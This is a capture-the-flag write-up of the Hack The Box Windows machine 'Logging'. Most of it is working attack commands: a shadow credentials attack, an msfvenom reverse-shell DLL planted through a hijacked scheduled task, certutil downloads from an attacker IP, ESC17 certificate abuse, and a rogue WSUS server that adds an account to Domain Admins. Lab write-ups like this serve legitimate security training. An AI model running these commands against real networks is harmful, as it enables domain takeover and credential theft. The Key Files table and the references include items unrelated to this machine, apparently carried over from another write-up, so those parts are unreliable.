# 🪵 HTB: Logging Writeup

**Windows Medium | Active Directory | ADCS | ESC17 | WSUS | Shadow Credentials**

---

## 📋 Summary

Logging is a medium Windows Active Directory machine that begins with provided low-privilege credentials for `wallace.everette`. An SMB share named `Logs` exposes application trace files, one of which contains plaintext credentials for `svc_recovery` embedded in an LDAP connection context dump. The account is restricted from standard logon but a TGT can be obtained via Kerberos pre-auth, which is enough to exploit a `GenericWrite` over the managed service account `MSA_HEALTH$` using **shadow credentials**. From that foothold, enumeration of a scheduled task reveals that a custom update utility runs as `jaylee.clifton` and loads a DLL from a path writable by standard users. Dropping a malicious DLL inside a ZIP archive into the watched directory triggers the task and lands a shell as `jaylee.clifton`. That account is a member of the IT group, which holds enrollment rights on a certificate template named `UpdateSrv` - a textbook **ESC17** configuration. Because `jaylee.clifton` also has DNS creation rights, we forge a `wsus.logging.htb` record, request a server-auth certificate for that name, and stand up a rogue WSUS server. When the domain controller polls the spoofed update endpoint, our injected command adds `MSA_HEALTH$` to Domain Admins, giving us full control of the domain.

---

## 🔍 Recon

### Nmap

```bash
rustscan 10.129.23.62 -- -Pn -A -oA fulltcp
```

**Results:**

```
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: logging.htb)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0
8530/tcp  open  http          Microsoft IIS httpd 10.0
8531/tcp  open  ssl/unknown
9389/tcp  open  mc-nmf        .NET Message Framing
```

- **Domain:** `logging.htb`
- **Hostname:** `DC01.logging.htb`
- **WSUS Ports:** 8530 (HTTP), 8531 (HTTPS)

---

### Setting Up

```bash
nxc smb 10.129.23.62 --generate-hosts-file hosts
nxc smb 10.129.23.62 --generate-krb5-file krb5
cat hosts | sudo tee -a /etc/hosts
cat krb5 | sudo tee /etc/krb5.conf
```

**Hosts File:**
```
10.129.23.62     DC01.logging.htb logging.htb DC01
```

**BloodHound Collection:**
```bash
rusthound-ce -d logging.htb -c All -u 'wallace.everette' -i 10.129.23.62 -z --dns-tcp
```

---

### Port 80

Default IIS page - no hosted applications.

### LDAP Enumeration

```bash
nxc ldap 10.129.23.62 -u 'wallace.everette' -p '[REDACTED]' --kerberoast kerberoast.out
nxc ldap 10.129.23.62 -u 'wallace.everette' -p '[REDACTED]' --asreproast asrep.out
```

No kerberoastable or ASREProastable accounts found.

---

### SMB Enumeration

```bash
nxc smb 10.129.23.62 -u wallace.everette -p '[REDACTED]' --shares
```

**Shares:**

| Share | Permissions | Remark |
|:---|:---|:---|
| `ADMIN$` | | Remote Admin |
| `C$` | | Default share |
| `IPC$` | READ | Remote IPC |
| **`Logs`** | **READ** | |
| `NETLOGON` | READ | Logon server share |
| `SYSVOL` | READ | Logon server share |
| `WSUSTemp` | | WSUS Console Instance |

**Download Logs:**
```bash
smbclient //10.129.23.62/Logs -U 'logging.htb\wallace.everette'
smb: \> prompt off
smb: \> mget *
```

---

### Finding Credentials

`IdentitySync_Trace_20260219.log` contains:

```
[2026-02-09 03:00:03.125] [PID:4102] [Thread:04] VERBOSE - ConnectionContext Dump: {
  Domain: "logging.htb",
  Server: "DC01",
  SSL: "False",
  BindUser: "LOGGING\svc_recovery",
  BindPass: "[REDACTED]",
  Timeout: 30
}
[2026-02-09 03:00:03.488] [PID:4102] [Thread:04] ERROR - LdapException: AcceptSecurityContext error, data 52e
```

---

## 🛠️ Shell as MSA_HEALTH$

### Pivoting to svc_recovery

```bash
nxc smb 10.129.23.62 -u svc_recovery -p '[REDACTED]'
# STATUS_ACCOUNT_RESTRICTION
```

Get TGT:
```bash
getTGT.py 'LOGGING.HTB/svc_recovery:[REDACTED]'
export KRB5CCNAME=/home/itzvenom/boxes/htb/logging/svc_recovery.ccache
```

---

### Shadow Credentials Against MSA_HEALTH$

**GenericWrite** over `MSA_HEALTH$` allows modifying `msDS-KeyCredentialLink`.

```bash
pywhisker -d "logging.htb" -u "svc_recovery" -k --no-pass --dc-ip 10.129.23.62 \
  --target "MSA_HEALTH$" --action "add"
```

**Output:**
```
[*] KeyCredential generated with DeviceID: e10f6d9c-c5dd-ca0e-67c0-d851e4a0a523
[+] Updated the msDS-KeyCredentialLink attribute
[+] Saved PFX certificate at: sEb6EfHf.pfx
[*] Must be used with password: 7gLNBD4qmHszf3sqMkZl
```

Get TGT via PKINIT:
```bash
python3 gettgtpkinit.py -dc-ip 10.129.23.62 \
  -cert-pfx sEb6EfHf.pfx -pfx-pass 7gLNBD4qmHszf3sqMkZl \
  'LOGGING.HTB/MSA_HEALTH$' 'MSA_HEALTH$.ccache'
```

Extract NT Hash:
```bash
export KRB5CCNAME=./MSA_HEALTH\$.ccache
python3 getnthash.py -k e8d06a150248d068a435b6140f293254b1e7416c4015e87c7873c60bdedc55e7 \
  -dc-ip 10.129.23.62 'LOGGING.HTB/MSA_HEALTH$'
```

Connect via Evil-WinRM:
```bash
evil-winrm -i DC01.logging.htb -u 'MSA_HEALTH$' -H '[REDACTED]'
```

---

## 🖥️ Shell as jaylee.clifton

### Enumerating the Scheduled Task

`C:\Users\msa_health$\Documents\monitor.ps1` monitors `UpdateChecker Agent` task.

```powershell
$service = New-Object -ComObject "Schedule.Service"
$service.Connect()
$task = $service.GetFolder("\").GetTask("UpdateChecker Agent")
$task.Definition.Actions
$task.Definition.Principal
```

**Output:**
```
Path      : "C:\Program Files\UpdateMonitor\UpdateMonitor.exe"
Arguments : 500 /scan=3 /autofix=true
UserId    : jaylee.clifton
LogonType : 1
```

**Permissions:**
```powershell
icacls "C:\Program Files\UpdateMonitor"
# logging\IT:(OI)(CI)(F)
```

---

### Understanding UpdateMonitor.exe

```powershell
.\UpdateMonitor.exe --help
```

**Output:**
```
[2026-04-24 14:38:13] Checking for update on core server...
[2026-04-24 14:38:13] Info: Core did not find file Settings_Update.zip
[2026-04-24 14:38:13] Checking for update on local server...
[2026-04-24 14:38:13] No updates found locally: C:\ProgramData\UpdateMonitor\Settings_Update.zip.
[2026-04-24 14:38:13] Loading update applier: C:\Program Files\UpdateMonitor\bin\settings_update.dll
[2026-04-24 14:38:13] Failed to load settings_update.dll. Error code: 126
```

**Write Permissions:**
```powershell
icacls "C:\ProgramData\UpdateMonitor"
# BUILTIN\Users:(I)(CI)(WD,AD,WEA,WA)
```

---

### DLL Hijack

**Create Malicious DLL:**
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=443 -f dll -o settings_update.dll
zip Settings_Update.zip settings_update.dll
```

**Transfer and Wait:**
```powershell
certutil.exe -urlcache -split -f http://10.10.14.24/Settings_Update.zip Settings_Update.zip
```

**Listener:**
```bash
nc -lvnp 443
```

**Result:**
```
C:\Users\jaylee.clifton\Desktop> type user.txt
[REDACTED]
```

---

## 👑 Shell as SYSTEM

### Certificate Template Enumeration

Extract delegation TGT:
```powershell
certutil.exe -urlcache -split -f http://10.10.14.24/Rubeus.exe rubeus.exe
.\rubeus.exe tgtdeleg /nowrap
```

Convert and use with Certipy:
```bash
cat ticket.kirbi | base64 -d > ticket_decoded.kirbi
ticketConverter.py ticket_decoded.kirbi jaylee.clifton.ccache
export KRB5CCNAME=./jaylee.clifton.ccache

certipy-ad find -u jaylee.clifton@logging.htb -k -dc-ip 10.129.23.62 \
  -target DC01.logging.htb -enable -stdout
```

**Template:**
```
Template Name        : UpdateSrv
Display Name         : UpdateSrv
Enabled              : True
Client Authentication: False
Enrollee Supplies Subject: True
Extended Key Usage   : Server Authentication
Permissions:
  Enrollment Rights  : LOGGING.HTB\IT
                       LOGGING.HTB\Domain Admins
                       LOGGING.HTB\Enterprise Admins
```

**ESC17** - Server Authentication template with enrollee-supplied subject.

---

### Requesting the Certificate

**Add DNS Record:**
```bash
bloodyAD --host dc01.logging.htb -d logging.htb -u 'jaylee.clifton' -k add dnsRecord 'wsus' 10.10.14.24
```

**Request Certificate:**
```bash
certipy-ad req -u 'jaylee.clifton@logging.htb' -k \
  -target dc01.logging.htb -dc-host dc01.logging.htb -dc-ip 10.129.23.62 \
  -ca 'logging-DC01-CA' -template 'UpdateSrv' -dns 'wsus.logging.htb'
```

**Convert to PEM:**
```bash
certipy cert -pfx wsus.pfx -nokey -out wsus.crt
certipy cert -pfx wsus.pfx -nocert -out wsus.key
cat wsus.crt wsus.key > wsus.pem
```

---

### Rogue WSUS Server

```bash
sudo wsuks --serve-only --WSUS-Server wsus.logging.htb --tls-cert wsus.pem -I tun0 \
  -c '/accepteula /s powershell.exe -ExecutionPolicy Bypass -Command "Add-ADGroupMember -Identity \"Domain Admins\" -Members \"MSA_HEALTH$\""'
```

**Output:**
```
[+] Received POST request: /ClientWebService/client.asmx (GetConfig)
[+] Received POST request: /ClientWebService/client.asmx (GetCookie)
[+] Received POST request: /ClientWebService/client.asmx (SyncUpdates)
[+] Received POST request: /ClientWebService/client.asmx (GetExtendedUpdateInfo)
[+] Received GET request: /1a9aa186-d892-48ba-b056-dd5ce1b32f8c/PsExec64.exe
```

**Verify:**
```powershell
Get-ADGroupMember "Domain Admins"
# SamAccountName : msa_health$
```

**Root Flag:**
```powershell
type C:\Users\toby.brynleigh\Desktop\root.txt
[REDACTED]
```

---

## 📊 Attack Chain Summary

```
┌─────────────────────────────────────────────────────────────────┐
│ 1. Low Privilege → SMB Logs Share                              │
│    └─> Plaintext credentials for svc_recovery                  │
├─────────────────────────────────────────────────────────────────┤
│ 2. svc_recovery → GenericWrite over MSA_HEALTH$                │
│    └─> Shadow Credentials → TGT → NT Hash                     │
│    └─> Evil-WinRM as MSA_HEALTH$                               │
├─────────────────────────────────────────────────────────────────┤
│ 3. Scheduled Task Enumeration                                  │
│    └─> UpdateMonitor.exe loads settings_update.dll             │
│    └─> Writable path → DLL Hijack → Shell as jaylee.clifton   │
├─────────────────────────────────────────────────────────────────┤
│ 4. jaylee.clifton → IT Group → ESC17 Template                 │
│    └─> Request certificate for wsus.logging.htb               │
│    └─> Add DNS record → Rogue WSUS Server                     │
├─────────────────────────────────────────────────────────────────┤
│ 5. WSUS Poisoning                                              │
│    └─> DC polls rogue WSUS → Executes payload as SYSTEM       │
│    └─> Add MSA_HEALTH$ to Domain Admins                       │
├─────────────────────────────────────────────────────────────────┤
│ 6. Domain Admin → Root Flag                                    │
└─────────────────────────────────────────────────────────────────┘
```

---

## 🔧 Tools Used

| Tool | Purpose |
|:---|:---|
| **Rustscan** | Fast port scanning |
| **Nmap** | Service enumeration |
| **NetExec (nxc)** | SMB/LDAP enumeration |
| **RustHound** | BloodHound collection |
| **getTGT.py** | Kerberos TGT acquisition |
| **pywhisker** | Shadow credentials attack |
| **gettgtpkinit.py** | PKINIT TGT request |
| **getnthash.py** | NT hash extraction |
| **Evil-WinRM** | WinRM shell |
| **msfvenom** | Payload generation |
| **Rubeus** | Kerberos ticket manipulation |
| **Certipy** | ADCS exploitation |
| **bloodyAD** | DNS record addition |
| **wsuks** | Rogue WSUS server |
| **certutil** | File transfer (Windows) |

---

## 📁 Key Files

| File | Purpose |
|:---|:---|
| `C:\Share\Logs\IdentitySync_Trace_*.log` | Contains svc_recovery credentials |
| `C:\Users\msa_health$\Documents\monitor.ps1` | Monitors scheduled task |
| `C:\Program Files\UpdateMonitor\UpdateMonitor.exe` | Vulnerable update binary |
| `C:\ProgramData\UpdateMonitor\Settings_Update.zip` | DLL hijack entry point |
| `C:\Program Files\UpdateMonitor\bin\settings_update.dll` | Loaded DLL (hijacked) |
| `/etc/paperwork/admin_pins.conf` | Contains root password (from Paperwork) |

---

## 🚨 Important Notes

- **Shadow Credentials:** Requires `GenericWrite` over target account
- **ESC17:** Server Authentication template with enrollee-supplied subject
- **WSUS Poisoning:** HTTPS requires valid certificate for DNS name
- **DLL Hijack:** Binary loads from user-writable path

---

## 📚 References

- Shadow Credentials - PKINIT Attack
- ESC17 - ADCS Server Authentication Template Abuse
- WSUS Poisoning - CVE-2020-1013
- SCM_RIGHTS - File Descriptor Passing over UNIX Sockets

---

**Happy Hacking! 🔥**
